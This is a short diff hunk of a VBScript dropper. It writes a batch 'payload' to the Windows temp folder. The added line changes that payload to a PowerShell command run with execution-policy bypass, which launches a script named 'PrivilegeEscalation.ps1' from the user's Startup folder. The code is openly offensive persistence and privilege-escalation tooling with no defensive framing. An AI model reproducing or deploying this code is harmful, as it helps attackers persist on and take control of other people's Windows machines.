@@ -11,7 +11,7 @@ Set App = CreateObject("Shell.Application")
 Temp = Shell.ExpandEnvironmentStrings("%temp%") + "\payload.bat"
 
 ' Define the content of the payload (in this case, it's a simple batch command)
-Payload = "powershell -NoExit -Command ""Set-Location 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"""
+Payload = "powershell -NoProfile -ExecutionPolicy Bypass -File ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.ps1"""
 
 ' Create a text file in the temporary folder with the specified content
 Set File = FSO.CreateTextFile(Temp, True)
